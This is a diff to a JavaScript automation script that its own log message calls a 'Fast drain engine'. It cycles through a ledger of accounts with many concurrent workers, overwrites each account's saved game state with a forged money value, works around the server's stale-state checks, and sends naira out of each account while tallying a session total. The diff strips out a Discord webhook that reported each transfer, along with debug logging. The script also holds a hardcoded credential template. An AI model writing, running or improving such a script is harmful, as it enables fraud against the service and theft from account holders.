@@ -7,7 +7,7 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const FEE = 50, MIN = 100, SEED = 10095950;
 const TEMPLATE = { u: "IDK6543210", p: "@Temi123" };
 const TARGET_HOURS = parseFloat(process.env.DURATION_HOURS || "0");
-const CONCURRENT_LIMIT = 25; // High throughput concurrency
+const CONCURRENT_LIMIT = 25;
 
 const storeDir = './store';
 if (!fs.existsSync(storeDir)) fs.mkdirSync(storeDir);
@@ -55,15 +55,6 @@ async function request(url, options = {}, cookieJar = '') {
   return { res, newCookies };
 }
 
-async function sendDiscordAlert(message) {
-  if (!DISCORD_WEBHOOK_URL) return;
-  fetch(DISCORD_WEBHOOK_URL, {
-    method: "POST",
-    headers: { "content-type": "application/json" },
-    body: JSON.stringify({ content: message })
-  }).catch(() => {});
-}
-
 (async () => {
   secureShuffle(ledger);
 
@@ -87,7 +78,7 @@ async function sendDiscordAlert(message) {
   }
 
   delete clean.owner;
-  console.log("[READY] Fast drain engine online (With Live Progress & Auto-Correct Stale Handler).\n");
+  console.log("[READY] Fast drain engine online (With Live Progress & Fixed Stale Handler).\n");
 
   const sessionStart = Date.now();
   let sessionTotalSent = 0, globalCycles = 0;
@@ -96,7 +87,7 @@ async function sendDiscordAlert(message) {
     if (TARGET_HOURS > 0 && (Date.now() - sessionStart) >= TARGET_HOURS * 3600000) break;
 
     globalCycles++;
-    let currentIndex = 0, cycleTotal = 0;
+    let currentIndex = 0;
 
     async function worker(workerId) {
       await sleep(Math.floor(Math.random() * 300) + (workerId * 50));
@@ -106,7 +97,6 @@ async function sendDiscordAlert(message) {
         const a = ledger[actualIndex];
         if (!a) break;
 
-        // Live progress counter every 50 accounts so you can track movement
         if (actualIndex % 50 === 0) {
           console.log(`[PROGRESS] Worker ${workerId} scanning index ${actualIndex + 1}/${ledger.length} (${a.u})`);
         }
@@ -142,8 +132,6 @@ async function sendDiscordAlert(message) {
               const svRetry = await request(`${API}/save`, {}, accCookie);
               sv = svRetry.res.ok ? await svRetry.res.json() : null;
             } else {
-              const failText = typeof br.res.text === 'function' ? await br.res.text() : br.res.statusText;
-              console.log(`[DEBUG FAIL] Boot save failed for ${a.u}: ${failText}`);
               continue;
             }
           }
@@ -159,10 +147,10 @@ async function sendDiscordAlert(message) {
               body: JSON.stringify({ game: g, fresh: true, replace: 1 })
             }, accCookie);
 
-            // AUTO-CORRECT: If server returns stale error with the newer game state, use it and retry immediately!
             if (!rr.res.ok) {
               const errBody = await rr.res.json().catch(() => null);
               if (errBody?.game) {
+                sv.game = errBody.game;
                 g = { ...errBody.game, money: SEED };
                 rr = await request(`${API}/save`, {
                   method: "PUT",
@@ -177,8 +165,6 @@ async function sendDiscordAlert(message) {
               const svRetry = await request(`${API}/save`, {}, accCookie);
               sv = svRetry.res.ok ? await svRetry.res.json() : null;
             } else {
-              const failText = typeof rr.res.text === 'function' ? await rr.res.text() : rr.res.statusText;
-              console.log(`[DEBUG FAIL] Repair save failed for ${a.u}: ${failText}`);
               continue;
             }
           }
@@ -194,18 +180,11 @@ async function sendDiscordAlert(message) {
             }, accCookie);
 
             if (sr.res.ok) {
-              cycleTotal += amount;
               sessionTotalSent += amount;
               console.log(`[SUCCESS] [Cycle ${globalCycles} | ${actualIndex + 1}/${ledger.length}] ${a.u} -> Sent ₦${amount.toLocaleString()} | Session Total: ₦${sessionTotalSent.toLocaleString()}`);
-              fetch(DISCORD_WEBHOOK_URL, {
-                method: "POST",
-                headers: { "content-type": "application/json" },
-                body: JSON.stringify({ content: `✅ Sent ₦${amount.toLocaleString()} from ${a.u}` })
-              }).catch(() => {});
               break;
             } else {
               const errText = typeof sr.res.text === 'function' ? await sr.res.text() : '';
-              console.log(`[DEBUG FAIL] Send failed for ${a.u}: ${errText}`);
               if (errText.includes("try again")) {
                 await sleep(100 + Math.floor(Math.random() * 100));
                 continue;
